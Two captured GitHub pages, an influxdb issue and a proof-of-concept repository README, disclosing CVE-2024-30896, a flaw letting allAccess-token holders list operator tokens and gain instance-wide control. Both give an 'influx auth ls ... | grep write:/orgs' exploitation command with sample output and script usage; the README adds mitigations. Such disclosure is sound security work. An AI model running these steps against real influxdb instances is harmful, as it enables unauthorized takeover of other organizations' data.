=== Content from github.com_e1158510_20250114_200500.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Finfluxdata%2Finfluxdb%2Fissues%2F24797)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Finfluxdata%2Finfluxdb%2Fissues%2F24797)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=influxdata%2Finfluxdb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[influxdata](/influxdata)
/
**[influxdb](/influxdata/influxdb)**
Public

* [Notifications](/login?return_to=%2Finfluxdata%2Finfluxdb) You must be signed in to change notification settings
* [Fork
  3.6k](/login?return_to=%2Finfluxdata%2Finfluxdb)
* [Star
   29.3k](/login?return_to=%2Finfluxdata%2Finfluxdb)

* [Code](/influxdata/influxdb)
* [Issues
  2k](/influxdata/influxdb/issues)
* [Pull requests
  57](/influxdata/influxdb/pulls)
* [Discussions](/influxdata/influxdb/discussions)
* [Actions](/influxdata/influxdb/actions)
* [Projects
  0](/influxdata/influxdb/projects)
* [Security](/influxdata/influxdb/security)
* [Insights](/influxdata/influxdb/pulse)

Additional navigation options

* [Code](/influxdata/influxdb)
* [Issues](/influxdata/influxdb/issues)
* [Pull requests](/influxdata/influxdb/pulls)
* [Discussions](/influxdata/influxdb/discussions)
* [Actions](/influxdata/influxdb/actions)
* [Projects](/influxdata/influxdb/projects)
* [Security](/influxdata/influxdb/security)
* [Insights](/influxdata/influxdb/pulse)

# Operator Token Privilege Escalation¬†#24797

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkOpenOpen[Operator Token Privilege Escalation](#top)#24797Copy linkAssignees [![gwossum](https://avatars.githubusercontent.com/u/10836954?s=64&v=4)](/gwossum)Labels[security](https://github.com/influxdata/influxdb/issues?q=state%3Aopen%20label%3A%22security%22)![@XenoM0rph97](https://avatars.githubusercontent.com/u/44051481?u=282c2b31f38644dc5a1432ec76578773a74b8d5d&v=4&size=80)
## Description

![@XenoM0rph97](https://avatars.githubusercontent.com/u/44051481?u=282c2b31f38644dc5a1432ec76578773a74b8d5d&v=4&size=48)[XenoM0rph97](https://github.com/XenoM0rph97)opened [on Mar 21, 2024](https://github.com/influxdata/influxdb/issues/24797#issue-2199946469)

**Summary:**

A business logic flaw in influxdb allows users who own a valid allAccess token to escalate their privileges at operator level by listing current authorization tokens.

**Example Scenario:**

Attacker might be a user which was gained access by an administrator via an allAccess token only within their organization.

This user's permissions will allow full control over the organization but will still prevent him to interact with other orgs.

**Impact:**

This vulnerability would allow a user to obtain unrestricted access to the influxdb instance. A similar condition might fully compromise Confidentiality, Integrity and Availability of data owned by users of different organizations. Additionally, since operator token has administrative permissions, Availability and Integrity of the entire influxdb instance might be compromised.

**Prerequisites/Limitations:**

1. Attacker must have a valid allAccess token
2. allAccess token must have been created in the same Org where an operator token resides (ex. same Org as Admin user)
3. Attacker must be able to interact with influxdb instance via CLI or APIs (influxClient)

**Steps to reproduce:**

***Scenario setup***

1. Access influxdb UI as admin user
2. Create a new user and assign it to any org which contains an operator token (ex. default organization) with:

```
influx auth user create -o xenoOrg -n xenoUser -p <password> -t <OperatorToken>

```

3. From influxdb UI generate a new allAccess token within the same org

***Exploitation (via CLI):***

1. Execute: `influx auth ls -t <allAccessToken> | grep write:/orgs`. This will list all current active operator tokens on the influxdb instance.

*Example*

```
# Using an allAccess token
influx auth ls -t U1OuqmFC{REDACTED} | grep U1OuqmFC{REDACTED}

0cc41c3b050e5000							U1OuqmFC{REDACTED}
admin		0cb9c92ee228b000	[read:orgs/87d0746948a3b3f5/authorizations write:orgs/87d0746948a3b3f5/authorizations read:orgs/87d0746948a3b3f5/buckets write:orgs/87d0746948a3b3f5/buckets read:orgs/87d0746948a3b3f5/dashboards write:orgs/87d0746948a3b3f5/dashboards read:/orgs/87d0746948a3b3f5 read:orgs/87d0746948a3b3f5/sources write:orgs/87d0746948a3b3f5/sources read:orgs/87d0746948a3b3f5/tasks write:orgs/87d0746948a3b3f5/tasks read:orgs/87d0746948a3b3f5/telegrafs write:orgs/87d0746948a3b3f5/telegrafs read:/users/0cb9c92ee228b000 write:/users/0cb9c92ee228b000 read:orgs/87d0746948a3b3f5/variables write:orgs/87d0746948a3b3f5/variables read:orgs/87d0746948a3b3f5/scrapers write:orgs/87d0746948a3b3f5/scrapers read:orgs/87d0746948a3b3f5/secrets write:orgs/87d0746948a3b3f5/secrets read:orgs/87d0746948a3b3f5/labels write:orgs/87d0746948a3b3f5/labels read:orgs/87d0746948a3b3f5/views write:orgs/87d0746948a3b3f5/views read:orgs/87d0746948a3b3f5/documents write:orgs/87d0746948a3b3f5/documents read:orgs/87d0746948a3b3f5/notificationRules write:orgs/87d0746948a3b3f5/notificationRules read:orgs/87d0746948a3b3f5/notificationEndpoints write:orgs/87d0746948a3b3f5/notificationEndpoints read:orgs/87d0746948a3b3f5/checks write:orgs/87d0746948a3b3f5/checks read:orgs/87d0746948a3b3f5/dbrp write:orgs/87d0746948a3b3f5/dbrp read:orgs/87d0746948a3b3f5/notebooks write:orgs/87d0746948a3b3f5/notebooks read:orgs/87d0746948a3b3f5/annotations write:orgs/87d0746948a3b3f5/annotations read:orgs/87d0746948a3b3f5/remotes write:orgs/87d0746948a3b3f5/remotes read:orgs/87d0746948a3b3f5/replications write:orgs/87d0746948a3b3f5/replications]

# Listing all available tokens passing allAccess token and retrieving only operator level tokens
influx auth ls -t U1OuqmFC{REDACTED} | grep write:/orgs

0cbb920e128e5000							gerKYLO0Ph_ibUk0y{REDACTED}
admin		0cb9c92ee228b000	[read:/authorizations write:/authorizations read:/buckets write:/buckets read:/dashboards write:/dashboards read:/orgs write:/orgs read:/sources write:/sources read:/tasks write:/tasks read:/telegrafs write:/telegrafs read:/users write:/users read:/variables write:/variables read:/scrapers write:/scrapers read:/secrets write:/secrets read:/labels write:/labels read:/views write:/views read:/documents write:/documents read:/notificationRules write:/notificationRules read:/notificationEndpoints write:/notificationEndpoints read:/checks write:/checks read:/dbrp write:/dbrp read:/notebooks write:/notebooks read:/annotations write:/annotations read:/remotes write:/remotes read:/replications write:/replications]

```

***Exploitation (via InfluxClient):***

[PoC Script for influx client](https://github.com/XenoM0rph97/cve-2024-xxxxx/blob/main/influxdbPrivescCVE_PoC_Script.py)

**Considerations:**

This might be an intended behaviour. Although, from the security perspective, a user who was gained limited access to a single entity should never be able to escalate their permissions to interact with other entities. Resulting in a critical business logic flaw.

**Potential root cause**:

allAccess tokens by default have permissions to list all authorizations that are defined in the same Org with no restrictions based on type (custom, allAccess, operator) -> `read:orgs/87d0746948a3b3f5/authorizations`.

**CVSS Base Score**: 9.1

**CVSS v3.1 Vector**: [AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1)

üëç1
## Metadata

### Assignees

* [![@gwossum](https://avatars.githubusercontent.com/u/10836954?s=64&v=4)gwossum](/gwossum)
### Labels

[security](https://github.com/influxdata/influxdb/issues?q=state%3Aopen%20label%3A%22security%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_e31df893_20250114_200458.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FXenoM0rph97%2FCVE-2024-30896)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FXenoM0rph97%2FCVE-2024-30896)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=XenoM0rph97%2FCVE-2024-30896)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[XenoM0rph97](/XenoM0rph97)
/
**[CVE-2024-30896](/XenoM0rph97/CVE-2024-30896)**
Public

* [Notifications](/login?return_to=%2FXenoM0rph97%2FCVE-2024-30896) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2FXenoM0rph97%2FCVE-2024-30896)
* [Star
   2](/login?return_to=%2FXenoM0rph97%2FCVE-2024-30896)

[2
stars](/XenoM0rph97/CVE-2024-30896/stargazers) [1
fork](/XenoM0rph97/CVE-2024-30896/forks) [Branches](/XenoM0rph97/CVE-2024-30896/branches) [Tags](/XenoM0rph97/CVE-2024-30896/tags) [Activity](/XenoM0rph97/CVE-2024-30896/activity)
 [Star](/login?return_to=%2FXenoM0rph97%2FCVE-2024-30896)

 [Notifications](/login?return_to=%2FXenoM0rph97%2FCVE-2024-30896) You must be signed in to change notification settings

* [Code](/XenoM0rph97/CVE-2024-30896)
* [Issues
  0](/XenoM0rph97/CVE-2024-30896/issues)
* [Pull requests
  0](/XenoM0rph97/CVE-2024-30896/pulls)
* [Actions](/XenoM0rph97/CVE-2024-30896/actions)
* [Projects
  0](/XenoM0rph97/CVE-2024-30896/projects)
* [Security](/XenoM0rph97/CVE-2024-30896/security)
* [Insights](/XenoM0rph97/CVE-2024-30896/pulse)

Additional navigation options

* [Code](/XenoM0rph97/CVE-2024-30896)
* [Issues](/XenoM0rph97/CVE-2024-30896/issues)
* [Pull requests](/XenoM0rph97/CVE-2024-30896/pulls)
* [Actions](/XenoM0rph97/CVE-2024-30896/actions)
* [Projects](/XenoM0rph97/CVE-2024-30896/projects)
* [Security](/XenoM0rph97/CVE-2024-30896/security)
* [Insights](/XenoM0rph97/CVE-2024-30896/pulse)

# XenoM0rph97/CVE-2024-30896

   ¬†main[Branches](/XenoM0rph97/CVE-2024-30896/branches)[Tags](/XenoM0rph97/CVE-2024-30896/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit¬†History[6 Commits](/XenoM0rph97/CVE-2024-30896/commits/main/) | | |
| [README.md](/XenoM0rph97/CVE-2024-30896/blob/main/README.md "README.md") | | [README.md](/XenoM0rph97/CVE-2024-30896/blob/main/README.md "README.md") |  |  |
| [influxdbPrivescCVE\_PoC\_Script.py](/XenoM0rph97/CVE-2024-30896/blob/main/influxdbPrivescCVE_PoC_Script.py "influxdbPrivescCVE_PoC_Script.py") | | [influxdbPrivescCVE\_PoC\_Script.py](/XenoM0rph97/CVE-2024-30896/blob/main/influxdbPrivescCVE_PoC_Script.py "influxdbPrivescCVE_PoC_Script.py") |  |  |
| [requirements.txt](/XenoM0rph97/CVE-2024-30896/blob/main/requirements.txt "requirements.txt") | | [requirements.txt](/XenoM0rph97/CVE-2024-30896/blob/main/requirements.txt "requirements.txt") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-30896

## Summary

A business logic flaw in influxdb allows users who own a valid allAccess token to escalate their privileges at operator level by listing current authorization tokens.

## Scenario

Attacker might be a user which was gained access by an administrator via an allAccess token only within their organization.
This user's permissions will allow full control over the organization but will still prevent him to interact with other orgs.

## Impact

This vulnerability would allow a user to obtain unrestricted access to the influxdb instance. A similar condition might fully compromise Confidentiality, Integrity and Availability of data owned by users of different organizations. Additionally, since operator token has administrative permissions, Availability and Integrity of the entire influxdb instance might be compromised.

## Prerequisites/Limitations

1. Attacker must have a valid allAccess token
2. allAccess token must have been created in the same Org where an operator token resides (ex. same Org as Admin user)
3. Attacker must be able to interact with influxdb instance via CLI or APIs (influxClient)

### Case 1: Exploitation via influxdb APIs:

*Script usage*

```
% python3 ./influxdbPrivescCVE_PoC.py -h
usage: influxdbPrivescCVE_PoC.py [-h] [-t TOKEN] [-e ENDPOINTURL] [-v [VERBOSE]] [-vv [VVERBOSE]]

optional arguments:
  -h, --help            show this help message and exit
  -t TOKEN, --token TOKEN
                        Custom or allAccess token to access influx DB instance
  -e ENDPOINTURL, --endpointUrl ENDPOINTURL
                        Endpoint Url of influxdb instance (ex. "https://myInfluxdbInstance:8086/")
  -v [VERBOSE], --verbose [VERBOSE]
                        Enable verbose logging - INFO
  -vv [VVERBOSE], --vverbose [VVERBOSE]
                        Enable verbose logging - DEBUG

```

### Case 2: Exploitation via influx CLI

1. Execute: `influx auth ls -t <allAccessToken> | grep write:/orgs`. This will list all current active operator tokens on the influxdb instance.

*Example*

```
# Using an allAccess token
influx auth ls -t U1OuqmFC{REDACTED} | grep U1OuqmFC{REDACTED}

0cc41c3b050e5000							U1OuqmFC{REDACTED}
admin		0cb9c92ee228b000	[read:orgs/87d0746948a3b3f5/authorizations write:orgs/87d0746948a3b3f5/authorizations read:orgs/87d0746948a3b3f5/buckets write:orgs/87d0746948a3b3f5/buckets read:orgs/87d0746948a3b3f5/dashboards write:orgs/87d0746948a3b3f5/dashboards read:/orgs/87d0746948a3b3f5 read:orgs/87d0746948a3b3f5/sources write:orgs/87d0746948a3b3f5/sources read:orgs/87d0746948a3b3f5/tasks write:orgs/87d0746948a3b3f5/tasks read:orgs/87d0746948a3b3f5/telegrafs write:orgs/87d0746948a3b3f5/telegrafs read:/users/0cb9c92ee228b000 write:/users/0cb9c92ee228b000 read:orgs/87d0746948a3b3f5/variables write:orgs/87d0746948a3b3f5/variables read:orgs/87d0746948a3b3f5/scrapers write:orgs/87d0746948a3b3f5/scrapers read:orgs/87d0746948a3b3f5/secrets write:orgs/87d0746948a3b3f5/secrets read:orgs/87d0746948a3b3f5/labels write:orgs/87d0746948a3b3f5/labels read:orgs/87d0746948a3b3f5/views write:orgs/87d0746948a3b3f5/views read:orgs/87d0746948a3b3f5/documents write:orgs/87d0746948a3b3f5/documents read:orgs/87d0746948a3b3f5/notificationRules write:orgs/87d0746948a3b3f5/notificationRules read:orgs/87d0746948a3b3f5/notificationEndpoints write:orgs/87d0746948a3b3f5/notificationEndpoints read:orgs/87d0746948a3b3f5/checks write:orgs/87d0746948a3b3f5/checks read:orgs/87d0746948a3b3f5/dbrp write:orgs/87d0746948a3b3f5/dbrp read:orgs/87d0746948a3b3f5/notebooks write:orgs/87d0746948a3b3f5/notebooks read:orgs/87d0746948a3b3f5/annotations write:orgs/87d0746948a3b3f5/annotations read:orgs/87d0746948a3b3f5/remotes write:orgs/87d0746948a3b3f5/remotes read:orgs/87d0746948a3b3f5/replications write:orgs/87d0746948a3b3f5/replications]

# Listing all available tokens passing allAccess token and retrieving only operator level tokens
influx auth ls -t U1OuqmFC{REDACTED} | grep write:/orgs

0cbb920e128e5000							gerKYLO0Ph_ibUk0y{REDACTED}
admin		0cb9c92ee228b000	[read:/authorizations write:/authorizations read:/buckets write:/buckets read:/dashboards write:/dashboards read:/orgs write:/orgs read:/sources write:/sources read:/tasks write:/tasks read:/telegrafs write:/telegrafs read:/users write:/users read:/variables write:/variables read:/scrapers write:/scrapers read:/secrets write:/secrets read:/labels write:/labels read:/views write:/views read:/documents write:/documents read:/notificationRules write:/notificationRules read:/notificationEndpoints write:/notificationEndpoints read:/checks write:/checks read:/dbrp write:/dbrp read:/notebooks write:/notebooks read:/annotations write:/annotations read:/remotes write:/remotes read:/replications write:/replications]

```

## Potential root cause

allAccess tokens by default have permissions to list all authorizations that are defined in the same Org with no restrictions based on type (custom, allAccess, operator) -> `read:orgs/87d0746948a3b3f5/authorizations`.

## Temporary Mitigation

When run, `influx setup` will create the first (default) org, in which an operator token will automatically be stored. Users should be granted access only to secondary created organizations.
It is recommended to create multiple organizations and pass the users only the ones which does not contain an operator token.

## Recommendations

* Do not share any organization which contains an operator token
* Avoid storing operator tokens in non-default orgs

**CVSS Base Score**: 9.1

**CVSS v3.1 Vector**: [AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&version=3.1)

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/XenoM0rph97/CVE-2024-30896/activity)
### Stars

[**2**
stars](/XenoM0rph97/CVE-2024-30896/stargazers)
### Watchers

[**1**
watching](/XenoM0rph97/CVE-2024-30896/watchers)
### Forks

[**1**
fork](/XenoM0rph97/CVE-2024-30896/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FXenoM0rph97%2FCVE-2024-30896&report=XenoM0rph97+%28user%29)

## [Releases](/XenoM0rph97/CVE-2024-30896/releases)

No releases published

## [Packages 0](/users/XenoM0rph97/packages?repo_name=CVE-2024-30896)

No packages published

## Languages

* [Python
  100.0%](/XenoM0rph97/CVE-2024-30896/search?l=python)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


